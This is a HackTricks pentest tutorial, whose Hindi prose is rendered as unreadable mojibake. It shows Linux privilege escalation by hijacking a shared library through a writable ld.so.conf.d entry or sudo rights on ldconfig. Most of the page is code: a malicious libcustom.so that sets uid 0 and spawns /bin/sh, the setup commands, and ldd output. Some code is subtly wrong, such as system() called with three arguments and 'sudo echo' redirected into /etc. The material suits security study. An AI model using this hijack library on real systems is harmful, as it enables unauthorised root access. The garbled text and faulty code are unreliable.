# ld.so privesc exploit example

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

## рдкрд░реНрдпрд╛рд╡рд░рдг рддреИрдпрд╛рд░ рдХрд░реЗрдВ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЦрдВрдб рдореЗрдВ рдЖрдкрдХреЛ рдлрд╛рдЗрд▓реЛрдВ рдХрд╛ рдХреЛрдб рдорд┐рд▓реЗрдЧрд╛ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдо рдкрд░реНрдпрд╛рд╡рд░рдг рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВ

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% endtab %}

{% tab title="libcustom.h" %}
```c
#include <stdio.h>

void vuln_func();
```
{% endtab %}

{% tab title="libcustom.c" %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% endtab %}
{% endtabs %}

1. **рдмрдирд╛рдПрдВ** рдЕрдкрдиреА рдорд╢реАрди рдореЗрдВ рдЙрди рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЙрд╕реА рдлреЛрд▓реНрдбрд░ рдореЗрдВ
2. **рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВ **рд▓рд╛рдЗрдмреНрд░реЗрд░реА**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **рдХреЙрдкреА** рдХрд░реЗрдВ `libcustom.so` рдХреЛ `/usr/lib` рдореЗрдВ: `sudo cp libcustom.so /usr/lib` (root privs)
4. **рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВ **рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### рдкрд░реНрдпрд╛рд╡рд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ _libcustom.so_ _/usr/lib_ рд╕реЗ **рд▓реЛрдб** рд╣реЛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЖрдк рдмрд╛рдЗрдирд░реА рдХреЛ **рдПрдХреНрдЬреАрдХреНрдпреВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

## рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рд╣рдо рдорд╛рди рд░рд╣реЗ рд╣реИрдВ рдХрд┐ **рдХрд┐рд╕реА рдиреЗ **_**/etc/ld.so.conf/**_** рдореЗрдВ рдПрдХ рдлрд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдмрдирд╛рдИ рд╣реИ**:

```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```

рд╡рд▓реНрдирд░реЗрдмрд▓ рдлреЛрд▓реНрдбрд░ _/home/ubuntu/lib_ рд╣реИ (рдЬрд╣рд╛рдБ рд╣рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ)ред\
**рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдХрдВрдкрд╛рдЗрд▓** рдХрд░реЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдЙрд╕ рдкрде рдХреЗ рдЕрдВрджрд░:

```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```

рдЕрдм рдЬрдмрдХрд┐ рд╣рдордиреЗ **рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП** рдкрде рдХреЗ рдЕрдВрджрд░ **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг libcustom рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдмрдирд╛ рд▓реА рд╣реИ**, рд╣рдореЗрдВ рдПрдХ **рд░рд┐рдмреВрдЯ** рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдпрд╛ рдлрд┐рд░ рд░реВрдЯ рдпреВрдЬрд░ рдХреЛ **`ldconfig`** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реБрдП рджреЗрдЦрдирд╛ рд╣реЛрдЧрд╛ (_рдпрджрд┐ рдЖрдк рдЗрд╕ рдмрд╛рдЗрдирд░реА рдХреЛ **sudo** рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЗрд╕рдореЗрдВ **suid рдмрд┐рдЯ** рд╣реИ рддреЛ рдЖрдк рдЗрд╕реЗ рд╕реНрд╡рдпрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рдкрд╛рдПрдВрдЧреЗ_).

рдПрдХ рдмрд╛рд░ рдЬрдм рдпрд╣ рд╣реЛ рдЬрд╛рдП, рддреЛ **рдкреБрдирдГ рдЬрд╛рдВрдЪреЗрдВ** рдХрд┐ `sharevuln` рдирд┐рд╖реНрдкрд╛рджрдирдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ `libcustom.so` рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдХрд╣рд╛рдБ рд╕реЗ рд▓реЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ:

```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╣ **`/home/ubuntu/lib` рд╕реЗ рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ** рдФрд░ рдЕрдЧрд░ рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рд╢реЗрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдордиреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рдмрдврд╝рд╛рдП рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрджреЗрд╢реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдФрд░ **рд░реВрдЯ рдпрд╛ рдЕрдиреНрдп рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдХреЗ** рд╣рдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### рдЕрдиреНрдп рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди - рд╕рдорд╛рди рджреЛрд╖

рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рд╣рдордиреЗ рдПрдХ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рдирдХрд▓реА рдмрдирд╛рдпрд╛ рдЬрд╣рд╛рдВ рдПрдХ рдкреНрд░рд╢рд╛рд╕рдХ рдиреЗ `/etc/ld.so.conf.d/` рдХреЗ рдЕрдВрджрд░ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЧреИрд░-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдлрд╝реЛрд▓реНрдбрд░ **рд╕реЗрдЯ рдХрд┐рдпрд╛**ред\
рд▓реЗрдХрд┐рди рдЕрдиреНрдп рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рднреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рдорд╛рди рджреЛрд╖ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддреЗ рд╣реИрдВ, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ `/etc/ld.so.conf.d` рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓** рдореЗрдВ, `/etc/ld.so.conf.d` рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдпрд╛ `/etc/ld.so.conf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ рддреЛ рдЖрдк рд╕рдорд╛рди рджреЛрд╖ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## Exploit 2

**рдорд╛рди рд▓реАрдЬрд┐рдП рдЖрдкрдХреЗ рдкрд╛рд╕ `ldconfig` рдкрд░ рд╕реБрдбреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ**ред\
рдЖрдк `ldconfig` рдХреЛ рдпрд╣ рдмрддрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдХрд╣рд╛рдВ рд╕реЗ рд▓реЛрдб рдХрд░реЗрдВ**, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЗрд╕рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ `ldconfig` рдордирдорд╛рдиреЗ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреЛ рд▓реЛрдб рдХрд░реЗред\
рддреЛ, рдЪрд▓рд┐рдП "/tmp" рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдмрдирд╛рддреЗ рд╣реИрдВ:

```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

рдЕрдм, **рдкрд┐рдЫрд▓реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ** рдореЗрдВ рдмрддрд╛рдП рдЧрдП рдЕрдиреБрд╕рд╛рд░, **`/tmp` рдХреЗ рдЕрдВрджрд░ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдмрдирд╛рдПрдВ**ред\
рдФрд░ рдЕрдВрдд рдореЗрдВ, рдкрде рдХреЛ рд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдмрд╛рдЗрдирд░реА рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдХрд╣рд╛рдВ рд╕реЗ рд▓реЛрдб рдХрд░ рд░рд╣реА рд╣реИ:

```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, `ldconfig` рдкрд░ sudo рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рд╕реЗ рдЖрдк рдЙрд╕реА рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

{% hint style="info" %}
рдореБрдЭреЗ `ldconfig` рдХреЛ **suid bit** рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ рдЗрд╕ рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рддрд░реАрдХрд╛ **рдирд╣реАрдВ рдорд┐рд▓рд╛**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддреНрд░реБрдЯрд┐ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## рд╕рдВрджрд░реНрдн

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTB рдореЗрдВ Dab machine

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>
